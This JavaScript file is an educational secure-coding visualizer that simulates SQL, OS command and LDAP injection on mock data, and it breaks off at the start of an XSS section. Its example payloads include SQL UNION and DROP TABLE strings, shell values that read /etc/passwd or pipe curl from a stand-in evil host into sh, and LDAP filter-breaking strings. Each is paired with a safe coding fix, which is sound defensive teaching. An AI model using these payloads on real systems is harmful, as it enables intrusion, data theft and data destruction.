/* Secure coding fundamentals visualizers. Every registered name is prefixed "security-fundamentals-". */
(() => {
  const esc = Viz.esc;
  const hl = (line, lang) => (window.LearningHome && window.LearningHome.highlight(line, lang)) ?? esc(line);
  const STATES = new Set(["active", "visit", "done", "bad", "path", "accent"]);
  const svg = (w, h, body, label) => `<svg class="dg sf-svg" viewBox="0 0 ${w} ${h}" width="${w}" role="img" aria-label="${esc(label)}">${body}</svg>`;
  const txt = (x, y, t, cls = "small", anchor = "start") => `<text class="${cls}" x="${x}" y="${y}" text-anchor="${anchor}">${esc(t)}</text>`;
  const arrow = (x1, y1, x2, y2, cls = "") => {
    const dx = x2 - x1, dy = y2 - y1, L = Math.hypot(dx, dy) || 1, ux = dx / L, uy = dy / L;
    const first = String(cls).split(" ")[0];
    const fill = STATES.has(first) ? "fill-" + first : "muted";
    return `<path class="edge ${cls}" d="M${x1},${y1} L${x2 - ux * 7},${y2 - uy * 7}"/><polygon class="${fill}" points="${x2},${y2} ${x2 - ux * 9 - uy * 4.5},${y2 - uy * 9 + ux * 4.5} ${x2 - ux * 9 + uy * 4.5},${y2 - uy * 9 - ux * 4.5}"/>`;
  };
  const stats = (items) => `<div class="sf-stats">${items.map(([l, v, c]) => `<div class="sf-stat ${c || ""}"><b>${esc(v)}</b><span>${esc(l)}</span></div>`).join("")}</div>`;
  const codePanel = (lines, lang, cur = [], title = "", marks = {}) => `<div class="sf-codebox">${title ? `<div class="sf-h">${esc(title)}</div>` : ""}<ol class="sf-code">${lines
    .map((l, i) => `<li class="${[].concat(cur).includes(i) ? "cur" : ""} ${marks[i] || ""}">${hl(l, lang) || "&nbsp;"}</li>`).join("")}</ol></div>`;
  const pick = (a) => a[Math.floor(Math.random() * a.length)];
  const rng = (seed) => () => { seed = (seed * 1664525 + 1013904223) >>> 0; return seed / 4294967296; };
  const verdict = (cls, head, sub) => `<div class="sf-verdict ${cls}">${esc(head)}${sub ? `<small>${sub}</small>` : ""}</div>`;
  const fmtDur = (s) => {
    if (!isFinite(s)) return "forever";
    if (s < 1e-3) return "instant";
    if (s < 1) return `${Math.round(s * 1000)} ms`;
    if (s < 120) return `${s.toFixed(s < 10 ? 1 : 0)} s`;
    if (s < 7200) return `${Math.round(s / 60)} min`;
    if (s < 172800) return `${Math.round(s / 3600)} h`;
    if (s < 3.15e7 * 2) return `${Math.round(s / 86400)} days`;
    const y = s / 3.15e7;
    return y < 1e6 ? `${Math.round(y).toLocaleString("en-US")} years` : `${y.toExponential(1).replace("e+", "e")} years`;
  };

  /* =====================================================================
   * 1. Injection: the same untrusted string reaches a SQL parser, a shell and an
   *    LDAP filter parser. A real tokenizer and evaluator decide what runs.
   * ===================================================================== */
  const PRODUCTS = [
    { name: "Coffee", price: 3.5, category: "drinks", visible: 1 },
    { name: "Tea", price: 2.9, category: "drinks", visible: 1 },
    { name: "Bagel", price: 2.2, category: "food", visible: 1 },
    { name: "Prototype X", price: 999, category: "drinks", visible: 0 },
  ];
  const USERS = [
    { name: "alice", email: "alice@shop.example", role: "customer" },
    { name: "admin", email: "root@shop.example", role: "admin" },
  ];
  const SQL_KW = new Set(["SELECT", "FROM", "WHERE", "AND", "OR", "NOT", "UNION", "DROP", "TABLE"]);
  const sqlLex = (s) => {
    const out = []; let i = 0;
    while (i < s.length) {
      const c = s[i];
      if (/\s/.test(c)) { i++; continue; }
      if (s.startsWith("--", i)) { out.push({ t: "comment", v: s.slice(i), a: i, b: s.length }); break; }
      if (c === "'") {
        let j = i + 1, v = "";
        for (;;) {
          if (j >= s.length) return { err: `unterminated string literal starting at column ${i + 1}`, toks: out };
          if (s[j] === "'" && s[j + 1] === "'") { v += "'"; j += 2; continue; }
          if (s[j] === "'") break;
          v += s[j++];
        }
        out.push({ t: "str", v, a: i, b: j + 1 }); i = j + 1; continue;
      }
      if (/[0-9]/.test(c)) { let j = i; while (j < s.length && /[0-9.]/.test(s[j])) j++; out.push({ t: "num", v: s.slice(i, j), a: i, b: j }); i = j; continue; }
      if (/[A-Za-z_@]/.test(c)) { let j = i; while (j < s.length && /[A-Za-z0-9_@]/.test(s[j])) j++; const w = s.slice(i, j); out.push({ t: w[0] === "@" ? "param" : SQL_KW.has(w.toUpperCase()) ? "kw" : "id", v: w, a: i, b: j }); i = j; continue; }
      if (s.startsWith("<>", i)) { out.push({ t: "op", v: "<>", a: i, b: i + 2 }); i += 2; continue; }
      if ("=,;*()".includes(c)) { out.push({ t: "op", v: c, a: i, b: i + 1 }); i++; continue; }
      return { err: `unexpected character '${c}' at column ${i + 1}`, toks: out };
    }
    return { toks: out };
  };
  const sqlRun = (toks, params) => {
    const ts = toks.filter((t) => t.t !== "comment");
    let p = 0;
    const peek = () => ts[p], kw = (w) => ts[p] && ts[p].t === "kw" && ts[p].v.toUpperCase() === w;
    const want = (w) => { if (!kw(w) && !(ts[p] && ts[p].v === w)) throw new Error(`expected ${w} near '${ts[p] ? ts[p].v : "end of input"}'`); p++; };
    const operand = () => {
      const t = ts[p++];
      if (!t) throw new Error("unexpected end of query");
      if (t.t === "str") return { k: "lit", v: t.v, s: `'${t.v}'` };
      if (t.t === "num") return { k: "lit", v: t.v, s: t.v };
      if (t.t === "param") { if (!(t.v in params)) throw new Error(`no value bound for ${t.v}`); return { k: "lit", v: params[t.v], s: `${t.v}` }; }
      if (t.t === "id") return { k: "col", v: t.v, s: t.v };
      throw new Error(`unexpected '${t.v}'`);
    };
    const cmp = () => {
      if (kw("NOT")) { p++; const e = cmp(); return { k: "not", e, s: `NOT ${e.s}` }; }
      if (peek() && peek().v === "(") { p++; const e = orE(); want(")"); return e; }
      const l = operand(); const op = ts[p++];
      if (!op || (op.v !== "=" && op.v !== "<>")) throw new Error(`expected = or <> after ${l.s}`);
      const r = operand();
      return { k: "cmp", op: op.v, l, r, s: `${l.s} ${op.v} ${r.s}` };
    };
    const andE = () => { let e = cmp(); while (kw("AND")) { p++; const r = cmp(); e = { k: "and", l: e, r, s: `(${e.s} AND ${r.s})` }; } return e; };
    const orE = () => { let e = andE(); while (kw("OR")) { p++; const r = andE(); e = { k: "or", l: e, r, s: `${e.s} OR ${r.s}` }; } return e; };
    const select = () => {
      want("SELECT");
      const cols = [];
      do { if (cols.length) p++; const t = ts[p++]; if (!t || (t.t !== "id" && t.v !== "*")) throw new Error("expected a column name"); cols.push(t.v); } while (peek() && peek().v === ",");
      want("FROM");
      const tb = ts[p++];
      if (!tb || tb.t !== "id") throw new Error("expected a table name");
      let where = null;
      if (kw("WHERE")) { p++; where = orE(); }
      return { cols, table: tb.v.toLowerCase(), where };
    };
    const stmts = [];
    while (p < ts.length) {
      if (ts[p].v === ";") { p++; continue; }
      if (kw("DROP")) { p++; want("TABLE"); const tb = ts[p++]; if (!tb) throw new Error("expected a table name"); stmts.push({ k: "drop", table: tb.v }); continue; }
      const parts = [select()];
      while (kw("UNION")) { p++; parts.push(select()); }
      if (p < ts.length && ts[p].v !== ";") throw new Error(`unexpected '${ts[p].v}' after the query`);
      stmts.push({ k: "select", parts });
    }
    const ev = (e, row) => {
      if (e.k === "lit") return e.v;
      if (e.k === "col") { if (!(e.v in row)) throw new Error(`unknown column ${e.v}`); return row[e.v]; }
      if (e.k === "cmp") { const a = String(ev(e.l, row)), b = String(ev(e.r, row)); return e.op === "=" ? a === b : a !== b; }
      if (e.k === "and") return ev(e.l, row) && ev(e.r, row);
      if (e.k === "or") return ev(e.l, row) || ev(e.r, row);
      if (e.k === "not") return !ev(e.e, row);
    };
    const results = stmts.map((st) => {
      if (st.k === "drop") return { k: "drop", table: st.table };
      const n = st.parts[0].cols.length;
      const rows = [];
      st.parts.forEach((pt, i) => {
        if (pt.cols.length !== n) throw new Error("each UNION query must have the same number of columns");
        const src = pt.table === "products" ? PRODUCTS : pt.table === "users" ? USERS : null;
        if (!src) throw new Error(`table ${pt.table} does not exist`);
        src.forEach((r) => { if (!pt.where || ev(pt.where, r)) rows.push({ part: i, table: pt.table, vals: (pt.cols[0] === "*" ? Object.keys(r) : pt.cols).map((c) => { if (!(c in r)) throw new Error(`unknown column ${c}`); return r[c]; }) }); });
      });
      return { k: "select", where: st.parts.map((x) => x.where && x.where.s).filter(Boolean), cols: st.parts[0].cols, rows };
    });
    return results;
  };

  const shSplit = (s) => {
    const cmds = []; let cur = "", i = 0, q = null;
    const push = (sep) => { if (cur.trim()) cmds.push({ cmd: cur.trim(), sep }); cur = ""; };
    while (i < s.length) {
      const c = s[i];
      if (q) { if (c === q) q = null; cur += c; i++; continue; }
      if (c === "'" || c === '"') { q = c; cur += c; i++; continue; }
      if (s.startsWith("$(", i)) { const j = s.indexOf(")", i); const inner = s.slice(i + 2, j < 0 ? s.length : j); cmds.push({ cmd: inner.trim(), sep: "$( )", sub: true }); cur += "<" + inner.trim() + " output>"; i = j < 0 ? s.length : j + 1; continue; }
      if (c === "`") { const j = s.indexOf("`", i + 1); const inner = s.slice(i + 1, j < 0 ? s.length : j); cmds.push({ cmd: inner.trim(), sep: "` `", sub: true }); cur += "<" + inner.trim() + " output>"; i = j < 0 ? s.length : j + 1; continue; }
      if (s.startsWith("&&", i) || s.startsWith("||", i)) { push(s.slice(i, i + 2)); i += 2; continue; }
      if (c === ";" || c === "|" || c === "\n" || c === "&") { push(c === "\n" ? "newline" : c); i++; continue; }
      cur += c; i++;
    }
    push("");
    return cmds;
  };
  const shEffect = (cmd, user) => {
    const w = cmd.split(/\s+/)[0];
    if (w === "ping") { const host = cmd.split(/\s+/).slice(-1)[0]; return { bad: false, out: `PING ${host}: 1 packet transmitted, 1 received` }; }
    if (w === "cat") return { bad: true, out: "root:x:0:0:root:/root:/bin/bash ... (file contents leak into the response)" };
    if (w === "curl" || w === "wget") return { bad: true, out: "downloads a script from the attacker's server" };
    if (w === "sh" || w === "bash") return { bad: true, out: "runs whatever the attacker downloaded, as the web server user" };
    if (w === "whoami" || w === "id") return { bad: true, out: "www-data (the output is smuggled out through a DNS lookup)" };
    if (w === "rm") return { bad: true, out: "deletes files" };
    return { bad: user, out: user ? "runs an attacker-chosen program" : "runs" };
  };

  const ldapEscape = (s) => s.replace(/[\\*()\0]/g, (c) => "\\" + c.charCodeAt(0).toString(16).padStart(2, "0"));
  const DIR = [
    { uid: "alice", department: "sales", title: "Account manager" },
    { uid: "bob", department: "sales", title: "Sales lead" },
    { uid: "admin", department: "it", title: "Domain administrator" },
    { uid: "carol", department: "hr", title: "Payroll" },
  ];
  const ldapParse = (s) => {
    let i = 0;
    const filt = () => {
      if (s[i] !== "(") throw new Error(`expected '(' at column ${i + 1}`);
      i++;
      const c = s[i];
      if (c === "&" || c === "|") {
        i++; const kids = [];
        while (s[i] === "(") kids.push(filt());
        if (s[i] !== ")") throw new Error(`expected ')' at column ${i + 1}`);
        i++; return { k: c, kids };
      }
      if (c === "!") { i++; const e = filt(); if (s[i] !== ")") throw new Error(`expected ')' at column ${i + 1}`); i++; return { k: "!", kids: [e] }; }
      const eq = s.indexOf("=", i), close = s.indexOf(")", i);
      if (eq < 0 || close < 0 || eq > close) throw new Error(`malformed item at column ${i + 1}`);
      const attr = s.slice(i, eq), raw = s.slice(eq + 1, close);
      i = close + 1;
      return { k: "=", attr, raw };
    };
    const tree = filt();
    return { tree, rest: s.slice(i) };
  };
  const ldapMatch = (n, e) => {
    if (n.k === "&") return n.kids.every((k) => ldapMatch(k, e));
    if (n.k === "|") return n.kids.some((k) => ldapMatch(k, e));
    if (n.k === "!") return !ldapMatch(n.kids[0], e);
    const v = e[n.attr];
    if (v === undefined) return false;
    const parts = n.raw.split("*").map((x) => x.replace(/\\([0-9a-f]{2})/gi, (_, h) => String.fromCharCode(parseInt(h, 16))).replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
    return new RegExp("^" + parts.join(".*") + "$", "i").test(v);
  };
  const ldapStr = (n) => (n.k === "=" ? `(${n.attr}=${n.raw})` : `(${n.k}${n.kids.map(ldapStr).join("")})`);

  const INJ = {
    "SQL (product search)": {
      label: "category typed by the user",
      tries: ["drinks", "drinks' OR '1'='1", "' OR 1=1 --", "' UNION SELECT name, email FROM users --", "'; DROP TABLE products; --", "O'Brien"],
      concat: ["string sql = \"SELECT name, price FROM products \" +", "    \"WHERE category = '\" + category + \"' AND visible = 1\";", "using var cmd = new SqlCommand(sql, conn);", "using var reader = cmd.ExecuteReader();"],
      safe: ["const string sql = \"SELECT name, price FROM products \" +", "    \"WHERE category = @category AND visible = 1\";", "using var cmd = new SqlCommand(sql, conn);", "cmd.Parameters.Add(\"@category\", SqlDbType.NVarChar, 40).Value = category;", "using var reader = cmd.ExecuteReader();"],
      lang: "csharp", safeName: "parameterized query",
    },
    "OS command (ping a host)": {
      label: "host typed by the user",
      tries: ["example.com", "example.com; cat /etc/passwd", "example.com && curl http://evil.example/x | sh", "$(whoami).attacker.example", "-f example.com"],
      concat: ["import subprocess", "# shell=True hands the whole string to /bin/sh", "out = subprocess.run(f\"ping -c 1 {host}\",", "                     shell=True, capture_output=True, text=True)"],
      safe: ["import re, subprocess", "if not re.fullmatch(r\"[A-Za-z0-9.-]{1,253}\", host) or host.startswith(\"-\"):", "    raise ValueError(\"not a hostname\")", "out = subprocess.run([\"ping\", \"-c\", \"1\", \"--\", host],   # argv list, no shell", "                     capture_output=True, text=True)"],
      lang: "python", safeName: "argv list + allowlist",
    },
    "LDAP (directory lookup)": {
      label: "uid typed by the user",
      tries: ["alice", "*", "admin)(&)", "*)(uid=*))(|(uid=*", "a*"],
      concat: ["// the app should only ever list people in the sales department", "String filter = \"(&(uid=\" + uid + \")(department=sales))\";", "NamingEnumeration<SearchResult> r =", "    ctx.search(\"ou=people,dc=shop,dc=example\", filter, controls);"],
      safe: ["// {0} is a filter argument: JNDI escapes * ( ) \\ and NUL for you", "String filter = \"(&(uid={0})(department=sales))\";", "NamingEnumeration<SearchResult> r =", "    ctx.search(\"ou=people,dc=shop,dc=example\", filter, new Object[] { uid }, controls);"],
      lang: "java", safeName: "filter arguments (escaped)",
    },
  };

  Viz.register("security-fundamentals-injection", (el) => Viz.player(el, {
    title: "Injection: when data is parsed as code",
    tag: "REAL PARSER · STEP THROUGH",
    legend: [["done", "user input, kept as data"], ["bad", "user input, parsed as code"], ["active", "current step"]],
    inputs: [
      { key: "target", label: "interpreter", type: "select", options: Object.keys(INJ), value: "SQL (product search)" },
      { key: "value", label: "untrusted input (try the Randomize button)", value: "' OR 1=1 --", width: 330 },
      { key: "mode", label: "how the code builds it", type: "select", options: ["string concatenation", "safe API"], value: "string concatenation" },
    ],
    random: () => { const target = pick(Object.keys(INJ)); return { target, value: pick(INJ[target].tries.slice(1)), mode: pick(["string concatenation", "string concatenation", "safe API"]) }; },
    build: ({ target, value, mode }) => {
      const T = INJ[target];
      if (value.length > 120) throw new Error("Keep the input under 120 characters.");
      const safe = mode === "safe API";
      const code = safe ? T.safe : T.concat;
      const fr = [];
      const base = { target, code, lang: T.lang, safe, value };
      fr.push({ ...base, stage: "input", line: 0, note: `The ${esc(T.label)} is <code>${esc(value)}</code>. ${safe ? `This version uses a <b>${esc(T.safeName)}</b>.` : "This version glues it into a string and hands the string to an interpreter."} Payloads to try: ${T.tries.map((t) => `<code>${esc(t)}</code>`).join(", ")}.` });

      if (target.startsWith("SQL")) {
        const pre = "SELECT name, price FROM products WHERE category = '", post = "' AND visible = 1";
        const q = safe ? "SELECT name, price FROM products WHERE category = @category AND visible = 1" : pre + value + post;
        const ua = safe ? -1 : pre.length, ub = safe ? -1 : pre.length + value.length;
        const lx = sqlLex(q);
        const toks = (lx.toks || []).map((t) => ({ ...t, user: t.a < ub && t.b > ua, code: t.a < ub && t.b > ua && t.t !== "str" }));
        fr.push({ ...base, stage: "text", q, ua, ub, line: safe ? 1 : 1, note: safe ? `The SQL text is a <b>constant</b>. The value travels separately as <code>@category = ${esc(JSON.stringify(value))}</code>, in its own protocol field. It is never spliced into the text.` : `Concatenation builds the SQL text. The database receives one string and cannot tell which characters you wrote and which the user wrote.` });
        if (lx.err) {
          fr.push({ ...base, stage: "tokens", q, ua, ub, toks, line: 3, err: lx.err, note: `The SQL lexer fails: <b>${esc(lx.err)}</b>. An honest customer called O'Brien just broke your search. The same flaw that lets attackers in also lets ordinary data crash the query.` });
          fr.push({ ...base, stage: "verdict", q, ua, ub, toks, err: lx.err, line: 3, verdict: "bad", head: "500 Internal Server Error", sub: "syntax error: and the error message itself tells an attacker the input reaches SQL", note: "Error messages that echo the SQL are a gift to attackers (<i>error-based injection</i>). Parameterization fixes both problems: the apostrophe becomes ordinary data." });
          return fr;
        }
        const codeToks = toks.filter((t) => t.code);
        fr.push({ ...base, stage: "tokens", q, ua, ub, toks, line: 3, note: safe ? `The parser sees ${toks.length} tokens, all from your constant text. <code>@category</code> is one placeholder token. Nothing the user typed is tokenized at all.` : codeToks.length ? `The parser sees ${toks.length} tokens. <b>${codeToks.length} of them came from the user but are code</b>: ${codeToks.map((t) => `<code>${esc(t.v.length > 30 ? t.v.slice(0, 30) + "…" : t.v)}</code>`).join(" ")}. The input closed the string literal and kept typing SQL.` : `The parser sees ${toks.length} tokens. The user's text stayed inside one string literal, so this input happened to be harmless.` });
        let res;
        try { res = sqlRun(lx.toks, safe ? { "@category": value } : {}); }
        catch (e) {
          fr.push({ ...base, stage: "verdict", q, ua, ub, toks, err: e.message, line: 3, verdict: "bad", head: "SQL error", sub: esc(e.message), note: `The query fails to parse: <b>${esc(e.message)}</b>.` });
          return fr;
        }
        const sel = res.find((r) => r.k === "select");
        fr.push({ ...base, stage: "parse", q, ua, ub, toks, res, line: 3, note: `Parsed WHERE clause: <code>${esc(sel ? sel.where.join("  UNION  ") : "")}</code>. ${!safe && /OR/.test(sel ? sel.where.join("") : "") ? "Note the precedence: <code>AND</code> binds tighter than <code>OR</code>, so the attacker's <code>OR</code> swallows the visibility check." : ""}${res.length > 1 ? ` Then <b>${res.length - 1} more statement(s)</b> follow the semicolon.` : ""}` });
        const leaked = sel ? sel.rows.filter((r) => r.table === "users" || (r.table === "products" && !PRODUCTS.find((p) => p.name === r.vals[0]).visible)).length : 0;
        const dropped = res.filter((r) => r.k === "drop");
        const bad = leaked > 0 || dropped.length > 0;
        fr.push({ ...base, stage: "verdict", q, ua, ub, toks, res, line: safe ? 4 : 3, verdict: bad ? "bad" : "done", head: bad ? (dropped.length ? "Table dropped" : `${leaked} row(s) leaked`) : `${sel.rows.length} row(s), as intended`, sub: bad ? (dropped.length ? "on drivers that allow multiple statements per command" : "hidden products or another table's data") : safe ? "the input was compared as one literal value" : "only because this particular input was benign",
          note: bad ? `${dropped.length ? `<b>DROP TABLE ${esc(dropped[0].table)}</b> runs as a second statement (SQL Server and some drivers accept batches; others reject them, which limits but doesn't remove the damage). ` : ""}${leaked ? `The response now contains <b>${leaked} row(s)</b> the page was never meant to show.` : ""} Switch to <b>safe API</b> to see the same input treated as a plain category name.`
            : safe ? `The database compared <code>category</code> with the whole string <code>${esc(value)}</code>, quotes and all. ${sel.rows.length ? "It matched a real category." : "No category has that name, so the result is empty, which is exactly right."}` : `Benign input, correct result. The code is still vulnerable: the next request can contain a quote.` });
        return fr;
      }

      if (target.startsWith("OS")) {
        if (safe) {
          const okHost = /^[A-Za-z0-9.-]{1,253}$/.test(value) && !value.startsWith("-");
          fr.push({ ...base, stage: "argv", argv: ["ping", "-c", "1", "--", value], line: 1, ok: okHost, note: `First the allowlist: <code>${esc(value)}</code> ${okHost ? "is a plausible hostname" : "<b>is rejected</b>: it contains characters a hostname never has, or starts with <code>-</code>"}.` });
          if (!okHost) {
            fr.push({ ...base, stage: "verdict", argv: ["ping", "-c", "1", "--", value], ok: false, line: 2, verdict: "done", head: "400 Bad Request", sub: "rejected before any process starts", note: "Validation rejects it. Even without the check, the argv list would have passed the whole string to ping as <b>one argument</b>, with no shell to interpret <code>;</code>, <code>&amp;&amp;</code>, <code>|</code> or <code>$( )</code>. And the <code>--</code> stops a leading dash from being read as an option." });
            return fr;
          }
          fr.push({ ...base, stage: "verdict", argv: ["ping", "-c", "1", "--", value], ok: true, line: 3, verdict: "done", head: "ping runs, nothing else", sub: "execve(\"ping\", argv): no shell involved", note: `The OS starts <b>one</b> process with five separate arguments. There is no shell, so there are no metacharacters to interpret.` });
          return fr;
        }
        const s = `ping -c 1 ${value}`;
        const cmds = shSplit(s);
        fr.push({ ...base, stage: "text", q: s, ua: 10, ub: 10 + value.length, line: 2, note: "The f-string builds one command line, and <code>shell=True</code> sends it to <code>/bin/sh -c</code>. The shell is a full programming language." });
        const runs = cmds.map((c, i) => ({ ...c, ...shEffect(c.cmd, i > 0 || c.sub) }));
        fr.push({ ...base, stage: "shell", q: s, ua: 10, ub: 10 + value.length, cmds: runs, line: 3, note: `The shell splits it at <code>;</code> <code>&amp;&amp;</code> <code>|</code> <code>$( )</code> and backticks: <b>${runs.length} command(s)</b> run${runs.some((r) => r.sub) ? ". Command substitution runs <i>first</i>, before ping even starts" : ""}.${value.trim().startsWith("-") ? " The value starts with <code>-</code>, so ping reads it as an <b>option</b> (here, a flood ping): that's <i>argument injection</i>, which even an argv list doesn't stop without <code>--</code>." : ""}` });
        const bad = runs.some((r) => r.bad) || value.trim().startsWith("-");
        fr.push({ ...base, stage: "verdict", q: s, ua: 10, ub: 10 + value.length, cmds: runs, line: 3, verdict: bad ? "bad" : "done", head: runs.some((r) => r.bad) ? "Remote code execution" : bad ? "Argument injection" : "ping runs, as intended", sub: runs.some((r) => r.bad) ? "with the web server's permissions" : bad ? "ping -f: a flood ping chosen by the attacker" : "only because this input was benign", note: bad ? "Whatever the web server's account can do, the attacker can now do. Switch to <b>safe API</b>: an argv list, an allowlist and <code>--</code>." : "Benign input. The design is still unsafe, because any later request can contain a semicolon." });
        return fr;
      }

      const f = safe ? `(&(uid=${ldapEscape(value)})(department=sales))` : `(&(uid=${value})(department=sales))`;
      const ua = 7, ub = 7 + (safe ? ldapEscape(value).length : value.length);
      fr.push({ ...base, stage: "text", q: f, ua, ub, line: 1, note: safe ? `The filter argument is escaped per RFC 4515 before it is inserted: <code>*</code> → <code>\\2a</code>, <code>(</code> → <code>\\28</code>, <code>)</code> → <code>\\29</code>, <code>\\</code> → <code>\\5c</code>.` : "The filter is built by concatenation. Parentheses and <code>*</code> are LDAP syntax, and the user can type them." });
      let parsed;
      try { parsed = ldapParse(f); }
      catch (e) {
        fr.push({ ...base, stage: "verdict", q: f, ua, ub, line: 3, verdict: "bad", head: "Invalid filter", sub: esc(e.message), note: `The directory rejects the filter: <b>${esc(e.message)}</b>.` });
        return fr;
      }
      const hits = DIR.filter((e) => ldapMatch(parsed.tree, e));
      fr.push({ ...base, stage: "ldap", q: f, ua, ub, tree: ldapStr(parsed.tree), rest: parsed.rest, hits, line: 3, note: `The server parses <code>${esc(ldapStr(parsed.tree))}</code>${parsed.rest ? ` and <b>ignores the trailing <code>${esc(parsed.rest)}</code></b> (many servers stop after the first complete filter)` : ""}. ${parsed.rest && !safe ? "The user's <code>)</code> closed the filter early, so the real <code>(department=sales)</code> condition sits in the ignored tail." : ""}` });
      const leaked = hits.filter((h) => h.department !== "sales");
      const bad = leaked.length > 0 || (!safe && /\*/.test(value) && hits.length > 1);
      fr.push({ ...base, stage: "verdict", q: f, ua, ub, tree: ldapStr(parsed.tree), rest: parsed.rest, hits, line: 3, verdict: bad ? "bad" : "done", head: leaked.length ? `${leaked.length} non-sales entr${leaked.length > 1 ? "ies" : "y"} leaked` : bad ? "Wildcard enumeration" : `${hits.length} match(es)`, sub: leaked.length ? leaked.map((h) => h.uid).join(", ") : bad ? "every uid in sales, one request" : safe ? "the input matched literally" : "benign input",
        note: bad ? `${leaked.length ? `The app was only supposed to show sales staff, and it just returned <b>${esc(leaked.map((h) => `${h.uid} (${h.department})`).join(", "))}</b>.` : "A wildcard turned a lookup into a listing. Attackers enumerate accounts this way."} Switch to <b>safe API</b>.` : safe ? `The escaped value is matched literally. ${hits.length ? "" : "No uid is literally that string, so nothing matches."}` : "Benign input; still vulnerable." });
      return fr;
    },
    render: (f) => {
      const parts = [];
      if (f.q !== undefined) {
        const q = f.q, a = f.ua, b = f.ub;
        let qh = "";
        if (a < 0) qh = esc(q).replace(/@category/g, '<span class="sf-ph">@category</span>');
        else if (f.toks && f.target.startsWith("SQL")) {
          for (let i = 0; i < q.length; i++) {
            const inU = i >= a && i < b;
            const tk = f.toks.find((t) => i >= t.a && i < t.b);
            const cls = inU ? (tk && tk.t === "str" ? "sf-data" : "sf-inj") : "";
            qh += cls ? `<span class="${cls}">${esc(q[i])}</span>` : esc(q[i]);
          }
        } else qh = esc(q.slice(0, a)) + `<span class="${f.stage === "text" || f.verdict !== "done" ? "sf-user" : "sf-data"}">${esc(q.slice(a, b))}</span>` + esc(q.slice(b));
        parts.push(`<div class="sf-qbox"><div class="sf-h">${f.target.startsWith("OS") ? "command line passed to /bin/sh -c" : f.target.startsWith("LDAP") ? "LDAP filter sent to the directory" : "SQL text sent to the database"}</div><pre class="sf-q">${qh}</pre>${a < 0 && f.target.startsWith("SQL") ? `<div class="sf-params">parameters: <code>@category</code> = <span class="sf-data">${esc(JSON.stringify(f.value))}</span> <em>(NVARCHAR(40), sent separately)</em></div>` : ""}</div>`);
      }
      if (f.toks && f.stage !== "text") {
        parts.push(`<div class="sf-toks">${f.toks.map((t) => `<span class="sf-tok sf-t-${t.t} ${t.code ? "bad" : t.user ? "done" : ""}"><em>${t.t}</em>${esc(t.v.length > 34 ? t.v.slice(0, 34) + "…" : t.v)}</span>`).join("")}${f.err ? `<span class="sf-tok bad"><em>error</em>${esc(f.err)}</span>` : ""}</div>`);
      }
      if (f.res) {
        const sel = f.res.find((r) => r.k === "select");
        const rows = sel ? sel.rows.map((r) => { const hidden = r.table === "users" || !PRODUCTS.find((p) => p.name === r.vals[0]).visible; return `<tr class="${hidden ? "sf-leak" : ""}">${r.vals.map((v) => `<td>${esc(String(v))}</td>`).join("")}<td class="sf-by">${r.table}${hidden ? (r.table === "users" ? " (other table!)" : " (hidden!)") : ""}</td></tr>`; }).join("") : "";
        parts.push(`<div class="sf-row">${sel ? `<table class="sf-tbl"><tr>${sel.cols.map((c) => `<th>${esc(c)}</th>`).join("")}<th>from</th></tr>${rows || `<tr><td colspan="${sel.cols.length + 1}" class="sf-by">(no rows)</td></tr>`}</table>` : ""}${f.res.filter((r) => r.k === "drop").map((r) => `<div class="sf-boom">DROP TABLE ${esc(r.table)}</div>`).join("")}</div>`);
      }
      if (f.cmds) parts.push(`<div class="sf-cmds">${f.cmds.map((c) => `<div class="sf-cmd ${c.bad ? "bad" : "done"}"><code>${esc(c.cmd)}</code><span>${c.sub ? "command substitution" : c.sep ? `followed by <b>${esc(c.sep)}</b>` : ""}</span><em>${esc(c.out)}</em></div>`).join("")}</div>`);
      if (f.argv) parts.push(`<div class="sf-argv">${f.argv.map((a, i) => `<span class="${i === 4 ? (f.ok ? "done" : "bad") : ""}"><em>argv[${i}]</em>${esc(a)}</span>`).join("")}</div>`);
      if (f.hits) parts.push(`<table class="sf-tbl"><tr><th>uid</th><th>department</th><th>title</th></tr>${DIR.map((e) => { const h = f.hits.includes(e); return `<tr class="${h ? (e.department === "sales" ? "sf-hit" : "sf-leak") : "sf-dim"}"><td>${e.uid}</td><td>${e.department}</td><td>${e.title}</td></tr>`; }).join("")}</table>`);
      if (f.verdict) parts.push(verdict(f.verdict, f.head, f.sub));
      return `<div class="sf-split"><div class="sf-split-l">${parts.join("")}</div><div class="sf-split-r">${codePanel(f.code, f.lang, [f.line], f.safe ? INJ[f.target].safeName : "string concatenation")}</div></div>`;
    },
  }));

  /* =====================================================================
   * 2. XSS: one value, four output contexts, three encoders, optional strict CSP.
   *    A small model of the HTML tokenizer decides what the browser executes.
   * ===================================================================== */
  const htmlEnc = (s) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  const htmlDec = (s) => s.replace(/&(amp|lt|gt|quot|#39|#x27|#(\d+));/g, (m, n, d) => ({ amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'", "#x27": "'" }[n] || String.fromCharCode(+d)));
  const jsEnc = (s) => s.replace(/[\\'"<>&\n\r]/g, (c) => ({ "\\": "\\\\", "\n": "\\n", "\r": "\\r" }[c] || "\\u" + c.charCodeAt(0).toString(16).toUpperCase().padStart(4, "0")));
  const jsDec = (s) => s.replace(/\\u([0-9a-fA-F]{4})|\\(.)/g, (m, u, c) => (u ? String.fromCharCode(parseInt(u, 16)) : c === "n" ? "\n" : c));
  const safeUrl = (u) => (/^\s*(https?:|mailto:|\/(?!\/)|#)/i.test(u) || !/^\s*[a-z][a-z0-9+.-]*:/i.test(u) ? u : "#blocked-unsafe-scheme");
  const XCTX = {
    "HTML body": { pre: "<p>Hello, ", post: "</p>", tpl: ["<p>Hello, @name</p>"], enc: "HtmlEncoder.Default.Encode(name)", right: "HtmlEncoder (same as above)", rf: htmlEnc },
    "HTML attribute": { pre: '<input name="q" value="', post: '">', tpl: ['<input name="q" value="@name">'], enc: "HtmlEncoder.Default.Encode(name)", right: "HtmlEncoder + always quote the attribute", rf: htmlEnc },
    "URL in href": { pre: '<a href="', post: '">your website</a>', tpl: ['<a href="@url">your website</a>'], enc: "HtmlEncoder.Default.Encode(url)", right: "allow http(s) only, then HtmlEncoder", rf: (s) => htmlEnc(safeUrl(s)) },
    "JavaScript string": { pre: "<script nonce=\"r4nd0m\">var name = '", post: "';</script>", tpl: ["<script nonce=\"@nonce\">", "  var name = '@name';", "</script>"], enc: "HtmlEncoder.Default.Encode(name)", right: "JavaScriptEncoder.Default.Encode(name)", rf: jsEnc },
  };
  const parseAttrs = (s, i) => {
    const attrs = [];
    while (i < s.length) {
